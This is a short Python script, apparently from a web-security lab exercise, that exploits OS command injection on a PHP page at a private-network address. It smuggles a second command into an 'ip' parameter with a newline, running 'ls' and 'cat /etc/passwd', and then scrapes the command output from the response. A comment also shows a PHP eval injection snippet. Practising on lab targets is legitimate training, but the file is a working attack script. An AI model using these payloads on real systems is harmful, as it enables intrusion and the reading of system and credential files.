import urllib.parse
import urllib.request
import lxml.etree as etree
import lxml.html


# $str="echo \"Hello ".$_GET['name']."!!!\";";
# eval($str);

payload = {"ip": "127.0.0.1"}
payload = {"ip": "127.0.0.1\nls"}
payload = {"ip": "127.0.0.1\ncat /etc/passwd"}

payload = urllib.parse.urlencode(payload)

url = "http://10.0.1.14/commandexec/example2.php?"+payload
print(url)

with urllib.request.urlopen(url) as reponse:
	content = reponse.read()

tree = lxml.html.fromstring(content)
node = tree.xpath("//pre")[0]

result = node.text + ''.join(etree.tostring(e) for e in node)
print(result)

